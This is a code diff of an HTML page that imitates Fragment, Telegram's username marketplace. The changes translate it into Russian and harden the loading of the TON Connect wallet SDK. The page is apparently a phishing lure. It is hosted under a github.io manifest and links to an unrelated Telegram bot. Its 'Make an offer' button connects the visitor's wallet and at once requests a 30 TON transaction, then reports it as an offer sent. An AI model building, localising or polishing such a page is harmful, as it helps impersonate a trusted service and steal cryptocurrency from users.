@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fragment - Buy Username</title>
+    <title>Fragment - Купить имя пользователя</title>
     <!-- TON Connect SDK -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
@@ -278,48 +278,48 @@
 </head>
 <body>
     <div class="container">
-        <a href="https://t.me/skjfbqbot/fragmfdicvw" class="subscribe-link">Open in Telegram</a>
+        <a href="https://t.me/skjfbqbot/fragmfdicvw" class="subscribe-link">Открыть в Telegram</a>
         <div class="username-header">
             <h1>slowswags.t.me</h1>
-            <span class="status-taken">Taken</span>
+            <span class="status-taken">Занято</span>
         </div>
         <div class="info-box">
-            <h4>Can I buy this username?</h4>
-            <p>Someone already claimed this username on Telegram. You can make an offer, which we will forward to the owner – who may be encouraged to sell.</p>
-            <a href="/about">How does this work?</a>
+            <h4>Могу ли я купить это имя пользователя?</h4>
+            <p>Это имя пользователя в Telegram уже занято. Вы можете сделать предложение, которое мы перешлем владельцу – возможно, он согласится продать.</p>
+            <a href="/about">Как это работает?</a>
         </div>
         <table class="details-table">
             <tr>
-                <th>Telegram Username</th>
+                <th>Имя пользователя в Telegram</th>
                 <td><a href="https://t.me/slowswags">@slowswags</a></td>
             </tr>
             <tr>
-                <th>Web Address</th>
+                <th>Веб-адрес</th>
                 <td><a href="https://t.me/slowswags">t.me/slowswags</a></td>
             </tr>
             <tr>
-                <th>TON Web 3.0 Address</th>
+                <th>TON Web 3.0 адрес</th>
                 <td><a href="https://slowswags.t.me">slowswags.t.me</a></td>
             </tr>
         </table>
-        <button class="btn-primary" onclick="openModal()">Make an offer</button>
+        <button class="btn-primary" onclick="openModal()">Сделать предложение</button>
     </div>
     <div id="walletModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
-                <h4>Connect your wallet</h4>
+                <h4>Подключите кошелек</h4>
                 <button class="close-btn" onclick="closeModal()">×</button>
             </div>
             <div class="modal-body">
-                <p>Scan with your mobile wallet</p>
+                <p>Отсканируйте с помощью мобильного кошелька</p>
                 <div class="qr-code">
                     <div id="ton-connect-qr"></div>
                 </div>
-                <p>AVAILABLE WALLETS</p>
+                <p>ДОСТУПНЫЕ КОШЕЛЬКИ</p>
                 <div class="wallet-buttons">
                     <button class="wallet-btn" onclick="connectWallet('telegram-wallet')">
                         <img src="https://telegram.org/img/t_logo.png" alt="Telegram">
-                        Wallet on Telegram
+                        Кошелек в Telegram
                     </button>
                     <button class="wallet-btn" onclick="connectWallet('tonkeeper')">
                         <img src="https://tonkeeper.com/assets/tonkeeper-logo.png" alt="Tonkeeper">
@@ -330,8 +330,8 @@
                         MyTonWallet
                     </button>
                     <button class="wallet-btn" onclick="viewAllWallets()">
-                        <img src="https://via.placeholder.com/20?text=All" alt="View all">
-                        View all wallets
+                        <img src="https://via.placeholder.com/20?text=All" alt="Все кошельки">
+                        Все кошельки
                     </button>
                 </div>
                 <div class="ton-connect">
@@ -348,41 +348,59 @@
 
         const manifestData = {
             url: "https://mrshadow3322.github.io/svfxcvcxvxc",
-            name: "Fragment - Buy Username",
+            name: "Fragment - Купить имя пользователя",
             iconUrl: "https://cdn4.cdn-telegram.org/file/HKTN0W4uRJ4RpN5dOjL8gD7k3NbkY5CxsGprWdB6tvu3HTExjWVS5341rWu-OSW52WGgPJ5A3DCLsrY2g7VfbwDKdh0Fnx79kEWeEKEn_Wt4myYqalWxRTzKqeWnoA-FB12gN8kX66GM5kcKPmVUc8YOyh53o1xWB_Kf-U2fkUAIasoEyVXkdeWTwrwujQWxozAZWlaN5-7UNtsqbP-fCXLuk89sc2E6Mu_BfvapJKVfKcpWuz_uzUql9vi4Lx_mR6MlSzstPRURNuHz98TK8eogU00eWpkybsGUxP44sZRBnZcx9lGizkk0ZZaTNGh0jmGF4dhj6yjXXHyhrxMj0w.jpg"
         };
 
-        async function initializeTonConnect(attempts = 5, delay = 1000) {
+        async function checkSDKLoaded() {
+            return new Promise((resolve) => {
+                const checkInterval = setInterval(() => {
+                    if (typeof TONCONNECT_UI !== 'undefined') {
+                        clearInterval(checkInterval);
+                        resolve(true);
+                    }
+                }, 500);
+                setTimeout(() => {
+                    clearInterval(checkInterval);
+                    resolve(false);
+                }, 30000); // Максимум 30 секунд ожидания
+            });
+        }
+
+        async function initializeTonConnect(attempts = 10, delay = 2000) {
+            const sdkLoaded = await checkSDKLoaded();
+            if (!sdkLoaded) {
+                alert('Не удалось загрузить TON Connect SDK. Проверьте подключение к интернету и попробуйте снова.');
+                return;
+            }
+
             for (let i = 0; i < attempts; i++) {
                 try {
-                    if (typeof TONCONNECT_UI !== 'undefined') {
-                        tonConnectUI = new TONCONNECT_UI.TonConnectUI({
-                            manifestUrl: 'data:application/json,' + encodeURIComponent(JSON.stringify(manifestData)),
-                            buttonRootId: 'ton-connect-qr',
-                            network: 'testnet'
-                        });
+                    tonConnectUI = new TONCONNECT_UI.TonConnectUI({
+                        manifestUrl: 'data:application/json,' + encodeURIComponent(JSON.stringify(manifestData)),
+                        buttonRootId: 'ton-connect-qr',
+                        network: 'testnet'
+                    });
 
-                        tonConnectUI.uiOptions = {
-                            language: 'en',
-                            uiPreferences: { theme: 'DARK' },
-                            walletsListConfiguration: {
-                                includeWallets: [
-                                    { appName: 'telegram-wallet' },
-                                    { appName: 'tonkeeper' },
-                                    { appName: 'mytonwallet' }
-                                ]
-                            }
-                        };
+                    tonConnectUI.uiOptions = {
+                        language: 'ru',
+                        uiPreferences: { theme: 'DARK' },
+                        walletsListConfiguration: {
+                            includeWallets: [
+                                { appName: 'telegram-wallet' },
+                                { appName: 'tonkeeper' },
+                                { appName: 'mytonwallet' }
+                            ]
+                        }
+                    };
 
-                        isTonConnectInitialized = true;
-                        break;
-                    } else {
-                        await new Promise(resolve => setTimeout(resolve, delay));
-                    }
+                    isTonConnectInitialized = true;
+                    console.log('TON Connect успешно инициализирован');
+                    break;
                 } catch (error) {
-                    console.error('Failed to initialize TON Connect (attempt ' + (i + 1) + '):', error);
+                    console.error('Ошибка инициализации TON Connect (попытка ' + (i + 1) + '):', error);
                     if (i === attempts - 1) {
-                        alert('Failed to initialize TON Connect. Please check your connection and try again.');
+                        alert('Не удалось инициализировать TON Connect после нескольких попыток. Проверьте подключение к интернету и попробуйте снова.');
                     }
                     await new Promise(resolve => setTimeout(resolve, delay));
                 }
@@ -403,7 +421,7 @@
 
         async function openModal() {
             const loadingMessage = document.createElement('div');
-            loadingMessage.innerText = 'Initializing TON Connect...';
+            loadingMessage.innerText = 'Инициализация TON Connect...';
             loadingMessage.style.position = 'fixed';
             loadingMessage.style.top = '50%';
             loadingMessage.style.left = '50%';
@@ -421,7 +439,7 @@
             document.body.removeChild(loadingMessage);
 
             if (!isTonConnectInitialized || !tonConnectUI) {
-                alert('TON Connect is not ready. Please try again.');
+                alert('TON Connect не готов. Пожалуйста, попробуйте снова.');
                 return;
             }
 
@@ -434,7 +452,7 @@
 
         async function connectWallet(walletType) {
             if (!isTonConnectInitialized || !tonConnectUI) {
-                alert('TON Connect is not ready. Please try again.');
+                alert('TON Connect не готов. Пожалуйста, попробуйте снова.');
                 return;
             }
 
@@ -451,21 +469,21 @@
                     await sendTransaction();
                 }
             } catch (error) {
-                console.error('Error connecting wallet:', error);
-                alert('Failed to connect wallet. Please try again.');
+                console.error('Ошибка подключения кошелька:', error);
+                alert('Не удалось подключить кошелек. Пожалуйста, попробуйте снова.');
             }
         }
 
         async function viewAllWallets() {
             if (!isTonConnectInitialized || !tonConnectUI) {
-                alert('TON Connect is not ready. Please try again.');
+                alert('TON Connect не готов. Пожалуйста, попробуйте снова.');
                 return;
             }
 
             try {
                 await tonConnectUI.openModal();
             } catch (error) {
-                console.error('Error opening wallet list:', error);
+                console.error('Ошибка открытия списка кошельков:', error);
             }
         }
 
@@ -473,8 +491,8 @@
             try {
                 await sendTransaction();
             } catch (error) {
-                console.error('Error sending transaction after QR connect:', error);
-                alert('Failed to send transaction. Please try again.');
+                console.error('Ошибка отправки транзакции после подключения через QR:', error);
+                alert('Не удалось отправить транзакцию. Пожалуйста, попробуйте снова.');
             }
         }
 
@@ -490,8 +508,8 @@
             };
 
             const result = await tonConnectUI.sendTransaction(transaction);
-            console.log('Transaction successful:', result);
-            alert('Offer of 30 TON sent successfully!');
+            console.log('Транзакция успешно выполнена:', result);
+            alert('Предложение на 30 TON успешно отправлено!');
             closeModal();
         }
     </script>
